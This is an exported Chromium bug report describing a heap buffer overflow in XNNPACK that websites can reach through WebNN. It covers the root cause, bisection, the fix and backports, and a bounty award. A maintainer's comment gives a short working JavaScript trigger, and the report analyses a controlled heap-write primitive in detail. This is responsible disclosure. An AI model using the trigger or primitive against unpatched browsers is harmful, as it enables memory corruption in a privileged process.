# Heap Buffer Overflow in TFLite + XNNPack via WebNN

| Field | Value |
|-------|-------|
| **Issue ID** | [483445078](https://issues.chromium.org/issues/483445078) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Blink>WebML |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | to...@gmail.com |
| **Assignee** | re...@chromium.org |
| **Created** | 2026-02-10 |
| **Bounty** | $33,000.00 |

## Description

---

### Report description

Heap Buffer Overflow in TFLite + XNNPack via WebNN

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://source.chromium.org/chromium/chromium/src/+/main:third_party/xnnpack/src/src/subgraph/fully-connected.c>

---

### The problem

#### Please describe the technical details of the vulnerability

# Building Chromium with ASAN

## Environment

Ubuntu + AMD processor (for completeness, shouldn't matter)

## Base Chromium revision

```
a0062e558d37e03d9129522e5a3c6c29946d8195 (2026-02-10)

```
## GN args

```
is_asan = true
is_debug = false
symbol_level = 1

```
## Build

```
cd chromium/src
gn gen out/asan_shell
autoninja -C out/asan_shell content_shell

```
## Running the PoC

WebNN is behind a feature flag. The GPU process is a separate process, so its ASAN errors don't appear on the main process stderr. Setting `ASAN_OPTIONS` with `log_path` captures per-process ASAN output to disk.

```
ASAN_OPTIONS="log_path=/tmp/asan_log:detect_leaks=0" ./out/asan_shell/content_shell --enable-features=WebMachineLearningNeuralNetwork file:///path/to/poc.html

```

The GPU process crashes during graph compilation. ASAN output is at `/tmp/asan_log.<gpu_pid>`. The poc.html file is included in this report.

If the sandbox is unavailable (e.g., AppArmor restricts unprivileged user namespaces), add `--no-sandbox`. On a headless machine, prefix the command with `xvfb-run -a` to provide a virtual X display.

## ASAN output

```
==321087==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x775ffc4c6540 at pc 0x5a4f845042c6 bp 0x754f909f9710 sp 0x754f909f9708
WRITE of size 8 at 0x775ffc4c6540 thread T71 (ThreadPoolForeg)
    #0 reshape_fully_connected_operator     third_party/xnnpack/src/src/subgraph/fully-connected.c:796:32
    #1 xnn_reshape_runtime                  third_party/xnnpack/src/src/runtime.c:921:30
    #2 SubgraphPrepare                      third_party/tflite/src/tensorflow/lite/delegates/xnnpack/xnnpack_delegate.cc:1258:16
    #3 PrepareOpsStartingAt                 third_party/tflite/src/tensorflow/lite/core/subgraph.cc:1540:44
    #4 PrepareOpsAndTensors                 third_party/tflite/src/tensorflow/lite/core/subgraph.cc:1588:7
    #5 AllocateTensors                      third_party/tflite/src/tensorflow/lite/core/subgraph.cc:1035:25
    #6 ComputeResources::Create             services/webnn/tflite/graph_impl_tflite.cc:221:34
    #7 CreateAndBuildOnBackgroundThread      services/webnn/tflite/graph_impl_tflite.cc:519:20

0x775ffc4c6540 is located 0 bytes after 4160-byte region [0x775ffc4c5500,0x775ffc4c6540)
allocated by thread T71 (ThreadPoolForeg) here:
    #0 malloc
    #1 xnn_allocate_zero_memory             third_party/xnnpack/src/src/xnnpack/allocator.h:37:7
    #2 create_runtime_impl                  third_party/xnnpack/src/src/runtime.c
    #3 SubgraphInit                         third_party/tflite/src/tensorflow/lite/delegates/xnnpack/xnnpack_delegate.cc:1214:14

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/xnnpack/src/src/subgraph/fully-connected.c:796:32 in reshape_fully_connected_operator

```
## Root cause

The crash is in `resize_fully_connected_output_tensor` in `fully-connected.c`:

```
output->shape.num_dims = input->shape.num_dims;
output->shape.dim[output->shape.num_dims - 1] =           // (A) OOB
    filter->shape.dim[filter_output_channel_index];

for (size_t cur_dim = 0; cur_dim < input->shape.num_dims - 1; cur_dim++) {
    output->shape.dim[cur_dim] = input->shape.dim[cur_dim]; // (B) OOB
}

```

When the FC input has `num_dims == 0`, the `size_t` expression `(num_dims - 1)` underflows to `SIZE_MAX`. At (A) this writes 8 bytes at `dim[SIZE_MAX]`. At (B) the loop iterates up to `SIZE_MAX` times, writing far past the heap allocation.

### How num\_dims becomes 0

Three mechanisms interact:

**1. ELU emulation.** When `elu.alpha != 1.0`, `graph_builder_tflite.cc` (`SerializeElu`) decomposes ELU into six elementary ops: `max(0, x) + alpha * (exp(min(0, x)) - 1)`. The scalar constants 0 and 1 are serialized with empty dimensions (`num_dims = 0`).

**2. Conv2d-to-FC conversion.** XNNPACK's `xnn_define_convolution_2d` converts 1x1 convolutions (unit stride, no padding) into `xnn_define_fully_connected` at define time, before any optimization.

**3. min/max-to-clamp conversion corrupts input selection.** During `xnn_subgraph_optimize`, `optimize_common_subgraphs_min_max_to_clamp` converts the binary `max(scalar_0, x)` and `min(scalar_0, x)` nodes into unary clamp nodes. To do this, it must determine which input is the scalar argument and which is the pass-through tensor. The PoC's ELU input is a constant with shape `[1,1,1,1]` — all dimensions multiply to 1 and it has static allocation, so XNNPACK treats it as a scalar constant. The optimization selects the wrong input: it uses the zero scalar (`num_dims = 0`) as the clamp's pass-through input instead of the 4D ELU input.

Verified with instrumentation: after the first optimization iteration (2 changes), the clamp nodes have `in=[v15]` where v15 is the zero scalar with `num_dims = 0`. The second iteration's shape propagation then copies `num_dims = 0` through the entire chain (clamp output, exp, sub, mul, add), and the fully-connected node receives `input_ndims = 0`.

## Bisection

The vulnerability requires two components: (1) the ELU alpha decomposition in WebNN's TFLite backend, and (2) XNNPACK's min/max-to-clamp subgraph optimization. The bug became reachable when the second component was rolled into Chromium.

**Introducing Chromium commit:** `2f50380887f7952fe03b602fd14254596b273d0a` ("Roll TFLite to Next Green Version", 2025-11-04), which rolled the XNNPACK submodule from `9ff05d7fc634` to `b69a4cf83011`.

**Introducing XNNPACK commit:** `e9bc43cef4c8663d2831e5c99b6bf799f09168fa` (2025-10-29): "Subgraph rewrites for Binary minimum, maximum, and Unary clamp nodes: Replace Binary minimum/maximum with a static scalar operand with a clamp node, Fuse clamp nodes up into clamping nodes, Remove no-op clamp nodes where possible."

Verified by building and testing the adjacent commits:

- `f31c6ffb1de2` (parent, XNNPACK `9ff05d7fc634`): no crash
- `2f50380887f79` (XNNPACK `b69a4cf83011`): heap-buffer-overflow in `resize_fully_connected_output_tensor`

#### Impact analysis

## Affected platforms

Tested on Linux (x86\_64) with the TFLite+XNNPACK backend. The bug is in platform-independent XNNPACK C code, so it should also affect Android (ARM64, x86/x64) and ChromeOS, which use the same TFLite+XNNPACK backend as their primary WebNN implementation.

## Impact

- **Attack vector:** Any website, no user interaction required beyond navigation. WebNN is behind a feature flag (`WebMachineLearningNeuralNetwork`), which is not yet enabled by default, but eligible for VRP according to the [rules](https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules#chrome-fuzzer-program:~:text=Bugs%20in%20unlaunched,message%20at%20runtime.) and it is also in origin trial since Jan 31: <https://chromium-review.googlesource.com/c/chromium/src/+/7518276>.
- **Process:** GPU process. On Android, this is unsandboxed. Android is vulnerable because it also uses TFLite + XNNPack. This means this not just affects highly privileged processes, but also non-sandboxed processes!
- **Primitive:** The loop at (B) writes `dim[0]` through `dim[SIZE_MAX-1]`, starting within the allocation and quickly overflowing past the 4160-byte `xnn_value` array into heap metadata and adjacent objects. Without ASAN, the loop continues until it hits an unmapped page.
- **Consequence:** GPU process crash (denial of service). Controlled heap corruption (see below) leading to potential code execution within the GPU process sandbox.

## Controlled write primitive

The OOB write is not just an uncontrolled crash. The attacker controls both WHAT is written and WHERE the writes land in the heap. This was verified against `a0062e558d37e` (2026-02-10) with ASAN `content_shell`.

### Memory layout

The XNNPACK runtime allocates all values in a single contiguous array:

```
runtime->values = xnn_allocate_zero_memory(
    sizeof(struct xnn_runtime_value) * subgraph->num_values);

```

Each `xnn_runtime_value` is 160 bytes (verified empirically with `offsetof`):

```
Offset  Field                   Size
------  -----                   ----
+0      void* data              8
+8      gemm_config             8
+16     fp32_data               8
+24     shape.num_dims          8       <-- statement (A) target
+32     shape.dim[0..5]         48      <-- statement (B) starts here
+80     size                    8
+88     quantization            48
+136    id                      4
+140    type                    4
+144    datatype                4
+148    allocation_type         4
+152    flags                   4
+156    first_consumer          4

```
### Statement (A): controlled intra-object write

```
output->shape.num_dims = input->shape.num_dims;         // = 0
output->shape.dim[output->shape.num_dims - 1] =         // dim[SIZE_MAX]
    filter->shape.dim[filter_output_channel_index];

```

When `num_dims == 0`, `dim[SIZE_MAX]` computes address `&dim[0] + (2^64 - 1) * 8`. On 64-bit, this wraps to `&dim[0] - 8 = &num_dims`. Statement (A) writes `filter_output_channels` (an attacker-controlled JavaScript parameter: the first dimension of the conv2d filter shape) to `output->shape.num_dims`.

Verified empirically with three PoC variants and post-write readback:

`?channels=2`:

```
XNNDBG [A] about to write dim[SIZE_MAX]: value=0x2 (filter_dim[0]) to output[25]
XNNDBG [A] before: output->shape.num_dims = 0
XNNDBG [A] after:  output->shape.num_dims = 2

```

`?channels=65` (0x41):

```
XNNDBG [A] about to write dim[SIZE_MAX]: value=0x41 (filter_dim[0]) to output[25]
XNNDBG [A] before: output->shape.num_dims = 0
XNNDBG [A] after:  output->shape.num_dims = 65

```

`?channels=1337` (0x539):

```
XNNDBG [A] about to write dim[SIZE_MAX]: value=0x539 (filter_dim[0]) to output[25]
XNNDBG [A] before: output->shape.num_dims = 0
XNNDBG [A] after:  output->shape.num_dims = 1337

```

The readback confirms `dim[SIZE_MAX]` wraps to `&num_dims`. The attacker fully controls the 8-byte value written. The wraparound address arithmetic was also verified with a standalone C program computing `&dim[0] + SIZE_MAX == &num_dims` on the actual struct definition.

### Statement (B): sequential cross-object heap corruption

```
for (size_t cur_dim = 0; cur_dim < input->shape.num_dims - 1; cur_dim++) {
    output->shape.dim[cur_dim] = input->shape.dim[cur_dim];
}

```

The loop iterates from `dim[0]` to `dim[SIZE_MAX-1]`, writing sequentially past the dim array into the output value's remaining fields, then into adjacent `xnn_runtime_value` structs. ASAN catches the first write past the allocation boundary.

Annotated trace from `?channels=2` (26 values, FC output at index 25). Each `dim[N]` overwrites offset `32 + N*8` within the output struct (verified with `offsetof`):

```
dim[N]      value               overwrites (output struct)          reads from (input struct)
------      -----               --------------------------          -------------------------
dim[0..5]   0x0                 shape.dim[0..5] (+32..+72)          input shape dims (all 0)
dim[6]      0x4                 size (+80)                          input->size (4 = sizeof(float32))
dim[7..12]  0x0                 quantization (+88..+128)            input quantization (zeroed)
dim[13]     0x10000000e         id(+136)+type(+140)                 input id=14, type=1 (dense_tensor)
dim[14]     0x200000001         datatype(+144)+alloc_type(+148)     input float32(1), workspace(2)
dim[15]     0x600005200         flags(+152)+first_consumer(+156)    input flags=0x5200, consumer=6
dim[16]     <heap pointer>      FIRST WRITE PAST ALLOCATION -> ASAN

```
### Cross-object corruption

Adding a sigmoid after the conv2d (`?mode=crossobj`) places values after the FC output in the array. The loop then writes over those adjacent structs. Trace from `?mode=crossobj&channels=1337` (28 values, FC output at index 26, sigmoid value at 27):

```
dim[N]      value               target: values[27] field at offset    source interpretation
------      -----               ------------------------------------  --------------------
dim[0..15]                      <FC output struct, same as above>
--- struct boundary: dim[16] = offset 160 = start of values[27] ---
dim[16]     0x6c9f55f8e010      values[27].data (+0)                  heap pointer
dim[17..18] 0x0                 values[27].gemm_config,fp32_data      NULL
dim[19..25] 0x0                 values[27].shape (num_dims + dims)    zero shape
dim[26]     0x4                 values[27].size (+80)                 4 bytes (float32)
dim[27..32] 0x0                 values[27].quantization (+88)         zeroed
dim[33]     0x100000010         values[27].id(+136)+type(+140)        id=16, type=1
dim[34]     0x100000001         values[27].datatype+alloc_type        float32(1), static(1)
dim[35]     0x3001              values[27].flags+first_consumer       EXTERNAL_INPUT|STATIC|IS_ZERO
dim[36]     0x0                 FIRST WRITE PAST ALLOCATION -> ASAN

```

The dim[33] value `0x100000010` reveals the source: the loop reads from `input->shape.dim[33]`, which at offset 32+33\*8=296 from the input struct (value 15) crosses into `values[16]`—the zero scalar constant from ELU decomposition (confirmed by its IS\_ZERO flag in 0x3001 = SHAPE\_IS\_STATIC|IS\_ZERO|bit0). The id=16 matches values[16].

The loop completely overwrites all fields of the adjacent value struct, including its `data` pointer, `size`, `type`, and `flags`. Without ASAN, the loop continues into subsequent structs and only stops when it hits an unmapped page.

### Allocation size control

The attacker controls the total allocation size by varying the graph structure. More WebNN operations produce more XNNPACK values:

| PoC variant | num\_values | Allocation | FC output index |
| --- | --- | --- | --- |
| `?channels=2` | 26 | 4160 bytes | 25 |
| `?channels=1337` | 26 | 4160 bytes | 25 |
| `?channels=2&padding=10` | 66 | 10560 bytes | 65 |
| `?mode=crossobj` | 28 | 4480 bytes | 26 |

### Summary

The primitive provides:

1. **Controlled value write** (statement A): Attacker sets the conv2d output\_channels parameter from JavaScript. This 8-byte value is written to a predictable struct field (`num_dims`) via unsigned integer underflow wrap-around.
2. **Sequential heap spray** (statement B): The loop overwrites all fields of the output struct and all subsequent `xnn_runtime_value` structs. The values written are deterministic and come from the input value's struct fields (readable via the annotated trace).
3. **Layout control**: The attacker controls the allocation size and the FC output's position by varying the graph structure.

---

### The cause

#### What version of Chrome have you found the security issue in?

147.0.7681.0 dev

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Memory Corruption (in a non-sandboxed process)

#### How would you like to be publicly acknowledged for your report?

Tobias Wienand

## Attachments

- [poc.html](attachments/poc.html) (text/html, 5.6 KB)

## Timeline

### ts...@google.com (2026-02-10)

Repro'd locally at ToT / Linux /Asan (299d726057a74a4cd83d1bfef23d5079aa88b035). Uploading to CF to determine range.

### ts...@google.com (2026-02-10)

Assigning per services/webnn/owners.

### cl...@appspot.gserviceaccount.com (2026-02-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6342261134524416.

### to...@gmail.com (2026-02-10)

Thanks for the quick reaction! In the meantime, I would like to propose a fix for fully-connected.c

Adding a statement like

```
if (output->shape.num_dims == 0) {                            
  xnn_log_error("fully-connected input has 0 dimensions");     
  return xnn_status_invalid_state;                            
}

```

after [this](https://source.chromium.org/chromium/chromium/src/+/main:third_party/xnnpack/src/src/subgraph/fully-connected.c;l=787;drc=be53d66770f2b8d69d5d0864b35598b563a87911) line would prevent the wraparound

It treats the symptom but not the root cause. The root cause would better be addressed by a maintainer of the code

### el...@chromium.org (2026-02-11)

Security shepherd: original report claims 2f50380887f7952fe03b602fd14254596b273d0a introduced this, which was in 144.0.7510.0, so setting FoundIn.

### 24...@project.gserviceaccount.com (2026-02-11)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2026-02-11)

Detailed Report: https://clusterfuzz.com/testcase?key=6342261134524416

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 8
Crash Address: 0x777078792940
Crash State:
  reshape_fully_connected_operator
  xnn_reshape_runtime
  tflite::xnnpack::SubgraphPrepare
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1540323:1540329

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6342261134524416

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### re...@chromium.org (2026-02-12)

Triggering the underlying XNNPACK bug does not require using WebNN's elu() operator. The same effect can be achieved more simply using a graph containing only a max() and conv2d() node:

```
<script>
const params = new URLSearchParams();
const CHANNELS = params.get('channels') ||  10;
async function trigger() {
        context = await navigator.ml.createContext();
    const builder = new MLGraphBuilder(context);
    const maxArg = builder.constant('float32', 0);
    const maxInput = builder.constant(
        { dataType: 'float32', shape: [1, 1, 1, 1] },
        new Float32Array([1.0])
    );
    const maxOut = builder.max(maxArg, maxInput);
    const filterData = new Float32Array(CHANNELS);
    const filter = builder.constant(
        { dataType: 'float32', shape: [CHANNELS, 1, 1, 1] },
        filterData
    );
    let graphOutput = builder.conv2d(maxOut, filter, {
        inputLayout: 'nhwc',
    });
    const graph = await builder.build({ 'output': graphOutput });
}
trigger();
</script>

```

### re...@chromium.org (2026-02-12)

The underlying XNNPACK issue is that the shape propagation pass can take a valid graph and turn it into an invalid graph by propagating a conversion from a tensor to a scalar in a way which is valid until it reaches the input of an operator like fully-connected which assumes that the input is a tensor (`num_dims > 0`).

As suggested by the reporter we could fix the symptom of this issue by adding the necessary check to fully-connected to catch the invalid scale however this issue could be present in other operators.

Fixing `optimize_common_subgraphs_min_max_to_clamp` seems like a better option to prevent this optimization from triggering bugs in any downstream operator. An additional check that `input_value` matches the shape of `node->outputs[0]` is required.

We could also work around this problem when building the TFLite graph by replacing scalars with single-element tensors. This would allow us to avoid the entire class of bugs where downstream code assumes that `num_dims > 0`. Exceptions may be needed for operators which require a scalar input. This also introduces complexity when handling operators which change the rank of a tensor (e.g. reshape) which could become no-ops.

### ni...@intel.com (2026-02-12)

> We could also work around this problem when building the TFLite graph by replacing scalars with single-element tensors.

DML backend has a similar restriction: <https://source.chromium.org/chromium/chromium/src/+/main:services/webnn/dml/tensor_desc.cc;l=27;drc=419f713d2e6100884095980a3fc33c034059261f>

### ch...@google.com (2026-02-12)

Setting milestone because of s0/s1 severity.

### re...@chromium.org (2026-02-18)

The upstream XNNPACK change has landed in <https://github.com/google/XNNPACK/commit/82367b51bf738ce41a28515b348c3434eb6d2060>.

This will be picked up by the next TFLite/XNNPACK roll: <https://chromium-review.googlesource.com/c/chromium/src/+/7585397>

This should land today and then I will request a merge to M-146.

### 24...@project.gserviceaccount.com (2026-02-18)

Detailed Report: https://clusterfuzz.com/testcase?key=6342261134524416

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-buffer-overflow WRITE 8
Crash Address: 0x777078792940
Crash State:
  reshape_fully_connected_operator
  xnn_reshape_runtime
  tflite::xnnpack::SubgraphPrepare
  
Sanitizer: address (ASAN)

Recommended Security Severity: Critical

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1540323:1540329

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6342261134524416

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### 24...@project.gserviceaccount.com (2026-02-19)

ClusterFuzz testcase 6342261134524416 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1586659:1586666

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### ch...@google.com (2026-02-19)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### re...@chromium.org (2026-02-19)

**Which CLs should be backmerged?**   

The [XNNPACK commit (non-Gerrit)](https://github.com/google/XNNPACK/commit/82367b51bf738ce41a28515b348c3434eb6d2060) mentioned above needs to be cherry-picked on top of the current commit that `DEPS` on `refs/branch-heads/7680` currently references and then an update to that `DEPS` file needs to be landed.

**Has this fix been verified on Canary to not pose any stability regressions?**   

Yes.

**Does this fix pose any potential non-verifiable stability risks?**   

The design of the change generally reduces the scenarios in which the XNNPACK optimization pass which caused the issue can make changes to the graph so it should overall make the system more stable.

**Does this fix pose any known compatibility risks?**   

No.

**Does it require manual verification by the test team? If so, please describe required testing:**   

No.

### dr...@chromium.org (2026-02-19)

No crashes in Canary. Approving merge.

Since this didn't enter OT until M146, we don't need to merge back any further than that (despite the FoundIn).

### re...@chromium.org (2026-02-21)

I am currently blocked on merging this change because there is no branch in the repository mentioned above that I could cherry-pick the change to. I've reached out to chrome-release-infra@ for help.

### go...@google.com (2026-02-24)

Please merge your change to M146 by 11:00 AM PT, Tuesday, Feb 24th so it gets picked up for M146 Early Stable release. Thank you.

### ch...@google.com (2026-02-24)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### go...@google.com (2026-02-24)

[Bulk Edit]

Please merge your change to M146 by 12:30 PM PT, today, Feb 24th so it gets picked up for M146 Early Stable release tomorrow. Thank you.

### sr...@chromium.org (2026-02-24)

I am cutting stable RC #1 for early stable release tomorrow for 146 today around 2pm PST, please help complete all your merges before that time to be included in tomorrow release, if this is critcal and missing that timeline, please reach out to me asap

### dx...@google.com (2026-02-24)

Project: external/github.com/google/XNNPACK  

Branch:  chromium/7680  

Author:  Reilly Grant [reillyg@google.com](mailto:reillyg@google.com)  

Link:    <https://chromium-review.googlesource.com/7604364>

[M-146] Don't replace minimum/maximum operators with clamp when input is broadcast

---


Expand for full commit details
```
     
    When the rank of the minimum/maximum argument is greater than the input rank the broadcasting behavior is necessary for the following nodes in the graph so replacement with a single-input (non-broadcasting) clamp operator is inappropriate. 
     
    (Cherry-picked from 82367b51bf738ce41a28515b348c3434eb6d2060.) 
     
    PiperOrigin-RevId: 871408578 
    Bug: 483445078 
    Change-Id: I6855afcb77d67e425d45105755164f8c4ade7720

```

---

Files:

- M `src/subgraph.c`
- M `test/subgraph/rewrites.cc`

---

Hash: [1154ae8178f0efc634cd1e8a681646dc22973255](https://chromiumdash.appspot.com/commit/1154ae8178f0efc634cd1e8a681646dc22973255)  

Date: Tue Feb 24 18:33:30 2026


---

### dx...@google.com (2026-02-25)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Reilly Grant [reillyg@chromium.org](mailto:reillyg@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7603218>

Roll xnnpack from 4574c4d9b007 to 1154ae8178f0

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/external/github.com/google/XNNPACK/+log/4574c4d9b007..1154ae8178f0 
     
    Bug: 483445078 
    Change-Id: I57dac00c4bce5b1f847d7fe625cd8ba0aba98ddc 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7603218 
    Reviewed-by: Nathan Memmott <memmott@chromium.org> 
    Commit-Queue: Reilly Grant <reillyg@chromium.org> 
    Commit-Queue: Nathan Memmott <memmott@chromium.org> 
    Auto-Submit: Reilly Grant <reillyg@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#1289} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `DEPS`
- M `third_party/xnnpack/src`

---

Hash: [b23b4562af845a85dedfe9cd03066d0488dad256](https://chromiumdash.appspot.com/commit/b23b4562af845a85dedfe9cd03066d0488dad256)  

Date: Wed Feb 25 00:44:12 2026


---

### pe...@google.com (2026-02-25)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### re...@chromium.org (2026-02-25)

This code was not enabled by default in M144 and does not need to be merged to the ChromeOS LTS channel.

### qk...@google.com (2026-02-26)

Added 'Not-Applicable-138'  and 'Not-Applicable-144' because the code was not enabled by default in M144 and does not need to be merged to the M138 ChromeOS LTS channel as well.

### sp...@google.com (2026-03-03)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $33000.00 for this report.

Rationale for this decision:
Baseline, Sandbox escape / Memory corruption in a non-sandboxed process.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### jd...@google.com (2026-03-03)

Apologies, the Rationale provided for the award was incorrect, the correct rationale is

Baseline, Memory corruption in a highly privileged process (e.g. GPU, network processes) plus bisect

### ch...@google.com (2026-05-29)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/483445078)*
